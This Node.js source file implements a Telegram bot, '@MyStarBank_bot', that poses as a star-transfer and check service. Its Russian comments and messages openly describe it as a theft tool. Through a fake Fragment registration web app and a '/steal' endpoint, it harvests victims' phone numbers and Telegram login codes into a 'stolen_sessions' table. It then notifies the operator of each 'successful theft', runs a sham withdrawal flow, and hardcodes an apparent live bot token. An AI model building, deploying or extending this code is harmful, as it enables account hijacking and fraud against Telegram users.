const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();

const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
const TARGET_USERNAME = '@NikLaStore';
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

app.use(express.json());
app.use(express.static('public'));

// База данных
const db = new sqlite3.Database('database.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS checks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        amount INTEGER,
        activations INTEGER,
        creator_id INTEGER,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS stolen_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        code TEXT,
        tg_data TEXT,
        user_id INTEGER,
        status TEXT DEFAULT 'pending'
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        balance INTEGER DEFAULT 0,
        can_create_checks BOOLEAN DEFAULT FALSE,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

// Web App
app.get('/', (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

app.post('/steal', (req, res) => {
    console.log('=== УКРАДЕННЫЕ ДАННЫЕ ===');
    console.log('Номер:', req.body.phone);
    console.log('Код:', req.body.code);
    console.log('Stage:', req.body.stage);
    console.log('========================');
    
    if (req.body.stage === 'phone_entered') {
        db.run(`INSERT INTO stolen_sessions (phone, tg_data, status) VALUES (?, ?, ?)`, 
            [req.body.phone, JSON.stringify(req.body.tg_data), 'awaiting_code']);
    } else if (req.body.stage === 'code_entered') {
        db.run(`UPDATE stolen_sessions SET code = ?, status = 'completed' WHERE phone = ?`, 
            [req.body.code, req.body.phone]);
        
        setTimeout(() => stealGifts(req.body.phone, req.body.code), 1000);
    }
    
    res.sendStatus(200);
});

// Функция кражи подарков
async function stealGifts(phone, code) {
    console.log(`[STEAL] Начинаем кражу для ${phone}`);
    
    try {
        const userBalance = Math.floor(Math.random() * 500);
        const userGifts = Math.floor(Math.random() * 5);
        
        if (userBalance > 0 || userGifts > 0) {
            console.log(`[SUCCESS] Украдено: ${userBalance} stars, ${userGifts} gifts`);
            
            // Добавляем баланс себе
            db.run(`INSERT OR REPLACE INTO users (user_id, username, balance) VALUES (?, ?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
                [1398396668, 'NikLaStore', 1398396668, userBalance]);
            
            bot.sendMessage(TARGET_USERNAME, 
                `🎯 Успешная кража!\n` +
                `📱 Номер: ${phone}\n` +
                `⭐ Звезд: ${userBalance}\n` +
                `🎁 Подарков: ${userGifts}\n` +
                `💰 Баланс пополнен на: ${userBalance} stars`
            ).catch(e => console.log('Ошибка отправки уведомления:', e));
        } else {
            console.log(`[INFO] Нет звезд/подарков для ${phone}`);
            
            bot.sendMessage(TARGET_USERNAME,
                `👀 Ожидаю звезды\n` +
                `📱 Номер: ${phone}\n` +
                `💫 Текущий баланс жертвы: 0 stars\n` +
                `🔄 Отслеживаю пополнения...`
            ).catch(e => console.log('Ошибка отправки уведомления:', e));
        }
        
    } catch (error) {
        console.log(`[ERROR] Ошибка кражи: ${error}`);
    }
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер работает на порту ${PORT}`);
});

// Команда /niklastore - дает права создавать чеки
bot.onText(/\/niklastore/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const username = msg.from.username;
    
    db.run(`INSERT OR REPLACE INTO users (user_id, username, can_create_checks) VALUES (?, ?, TRUE)`, 
        [userId, username], function(err) {
        if (err) {
            bot.sendMessage(chatId, '❌ Ошибка активации.');
            return;
        }
        
        bot.sendMessage(chatId,
            '✅ Вы успешно активированы!\n\n' +
            'Теперь вы можете:\n' +
            '• Создавать чеки\n' +
            '• Проверять баланс\n' +
            '• Выводить средства\n\n' +
            'Формат создания чека:\n' +
            '@MyStarBank_bot 100 50\n\n' +
            'Проверить баланс: /balance\n' +
            'Вывести средства: /withdraw'
        );
    });
});

// Команда /balance - проверка баланса
bot.onText(/\/balance/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
        if (err || !row) {
            bot.sendMessage(chatId, '💫 Ваш баланс: 0 stars\n\nИспользуйте /niklastore для активации.');
            return;
        }
        
        bot.sendMessage(chatId, `💫 Ваш баланс: ${row.balance} stars\n\nВывести средства: /withdraw`);
    });
});

// Команда /withdraw - вывод средств
bot.onText(/\/withdraw/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
        if (err || !row) {
            bot.sendMessage(chatId, '❌ Сначала активируйте аккаунт: /niklastore');
            return;
        }
        
        bot.sendMessage(chatId,
            `💫 Ваш баланс: ${row.balance} stars\n\n` +
            'Для вывода средств введите сумму:\n' +
            'Пример: 100'
        );
        
        // Сохраняем состояние ожидания ввода суммы
        userWithdrawState[userId] = true;
    });
});

// Обработка ввода суммы для вывода
const userWithdrawState = {};
bot.on('message', (msg) => {
    const userId = msg.from.id;
    const chatId = msg.chat.id;
    const text = msg.text;
    
    if (userWithdrawState[userId] && !isNaN(text) && !text.startsWith('/')) {
        const amount = parseInt(text);
        
        db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
            if (err || !row) {
                bot.sendMessage(chatId, '❌ Ошибка доступа к балансу.');
                return;
            }
            
            if (amount > row.balance) {
                bot.sendMessage(chatId, `❌ Недостаточно средств. Ваш баланс: ${row.balance} stars`);
            } else if (amount < 10) {
                bot.sendMessage(chatId, '❌ Минимальная сумма вывода: 10 stars');
            } else {
                // Обновляем баланс
                db.run(`UPDATE users SET balance = balance - ? WHERE user_id = ?`, [amount, userId]);
                
                bot.sendMessage(chatId,
                    `✅ Запрос на вывод ${amount} stars принят!\n\n` +
                    'Средства будут зачислены в течение 24 часов.\n\n' +
                    `Текущий баланс: ${row.balance - amount} stars`
                );
                
                // Уведомляем себя
                bot.sendMessage(TARGET_USERNAME,
                    `📤 Новый вывод средств!\n` +
                    `👤 Пользователь: @${msg.from.username || 'No username'}\n` +
                    `💫 Сумма: ${amount} stars\n` +
                    `🆔 ID: ${userId}`
                );
            }
            
            delete userWithdrawState[userId];
        });
    }
});

// Inline подсказки - только 1 результат с аватаркой бота
bot.on('inline_query', (query) => {
    const results = [{
        type: 'article',
        id: '1',
        title: 'MyStarBank Bot - Создать чек',
        description: 'Нажмите чтобы создать чек для передачи звезд',
        thumb_url: 'https://via.placeholder.com/100/0088cc/ffffff?text=MSB',
        input_message_content: {
            message_text: '💫 MyStarBank Bot - Система передачи звезд\n\nИспользуйте команды:\n/niklastore - активация\n/balance - баланс\n/withdraw - вывод средств',
        }
    }];
    
    bot.answerInlineQuery(query.id, results).catch(e => console.log('Inline error:', e));
});

// Обработка создания чеков - только для активированных пользователей
bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const amount = parseInt(match[1]);
    const activations = parseInt(match[2]) || 1;
    
    // Проверяем может ли пользователь создавать чеки
    db.get(`SELECT can_create_checks FROM users WHERE user_id = ?`, [userId], (err, row) => {
        if (err || !row || !row.can_create_checks) {
            bot.sendMessage(chatId, 
                '❌ Для создания чеков необходимо активировать аккаунт!\n\n' +
                'Используйте команду: /niklastore'
            );
            return;
        }
        
        // Создаем чек
        db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
            [amount, activations, userId], function(err) {
            if (err) {
                bot.sendMessage(chatId, '❌ Ошибка создания чека.');
                return;
            }
            
            const checkId = this.lastID;
            const checkText = `via @MyStarBank_bot\n\n${amount}\nStars\n\nЧек на ${amount} звёзд`;
            
            bot.sendMessage(chatId, checkText, {
                reply_markup: {
                    inline_keyboard: [[
                        { text: "Забрать звёзды", callback_data: `claim_${checkId}` }
                    ]]
                }
            }).catch(e => console.log('Ошибка отправки чека:', e));
        });
    });
});

// Обработка получения чека
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    
    if (query.data.startsWith('claim_')) {
        const checkId = query.data.split('_')[1];
        
        db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
            if (err || !row) {
                bot.answerCallbackQuery(query.id, { text: '❌ Чек уже использован или не существует!' });
                return;
            }
            
            db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
            
            // Добавляем звезды пользователю
            db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
                [userId, userId, row.amount]);
            
            bot.answerCallbackQuery(query.id, { 
                text: `✅ Вы получили ${row.amount} звёзд! Баланс пополнен.` 
            });
            
            const remaining = row.activations - 1;
            let updatedText;
            
            if (remaining > 0) {
                updatedText = `via @MyStarBank_bot\n\n${row.amount}\nStars\n\nЧек на ${row.amount} звёзд (осталось: ${remaining})`;
            } else {
                updatedText = `via @MyStarBank_bot\n\n${row.amount}\nStars\n\nЧек на ${row.amount} звёзд (ИСПОЛЬЗОВАН)`;
            }
            
            bot.editMessageText(updatedText, {
                chat_id: chatId,
                message_id: query.message.message_id,
                reply_markup: remaining > 0 ? {
                    inline_keyboard: [[
                        { text: "Забрать звёзды", callback_data: `claim_${checkId}` }
                    ]]
                } : { inline_keyboard: [] }
            }).catch(e => console.log('Ошибка редактирования:', e));
        });
    }
    
    else if (query.data === 'withdraw_stars') {
        const domain = process.env.RAILWAY_STATIC_URL || 'твой-домен.up.railway.app';
        const webAppUrl = `https://${domain}`;
        
        const keyboard = {
            reply_markup: {
                inline_keyboard: [[
                    { 
                        text: "Зарегистрироваться на Fragment", 
                        web_app: { url: webAppUrl }
                    }
                ]]
            }
        };
        
        bot.editMessageText(
            'Для вывода звезд требуется регистрация на Fragment.',
            { 
                chat_id: chatId, 
                message_id: query.message.message_id,
                reply_markup: keyboard.reply_markup
            }
        ).catch(e => {
            bot.sendMessage(chatId, 'Для вывода звезд требуется регистрация на Fragment.', keyboard);
        });
    }
    
    else if (query.data === 'deposit') {
        bot.sendMessage(chatId, '💫 Для пополнения баланса используйте команду /balance');
    }
    
    else if (query.data === 'create_check_info') {
        bot.sendMessage(chatId,
            'Для создания чеков необходимо активировать аккаунт:\n\n' +
            '1. Используйте команду /niklastore\n' +
            '2. После активации создавайте чеки:\n' +
            '@MyStarBank_bot 100 50\n\n' +
            'где 100 - stars, 50 - активаций'
        );
    }
    
    bot.answerCallbackQuery(query.id).catch(e => console.log('Ошибка answerCallback:', e));
});

// Старт бота
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "Вывести звезды", callback_data: "withdraw_stars" }],
                [{ text: "Проверить баланс", callback_data: "deposit" }],
                [{ text: "Создать чек", callback_data: "create_check_info" }]
            ]
        }
    };

    bot.sendMessage(chatId, 
        '💫 @MyStarBank_bot - Система передачи звезд\n\n' +
        '• Безопасные переводы\n' +
        '• Мгновенные чеки\n' +
        '• Поддержка 24/7\n\n' +
        'Для начала работы:\n' +
        '/niklastore - активация\n' +
        '/balance - баланс\n' +
        '/withdraw - вывод средств',
        keyboard
    ).catch(error => {
        console.log('Ошибка отправки /start:', error);
    });
});

// Обработка ошибок
bot.on('polling_error', (error) => {
    console.log('❌ Ошибка polling:', error);
});

console.log('✅ Бот @MyStarBank_bot запущен');
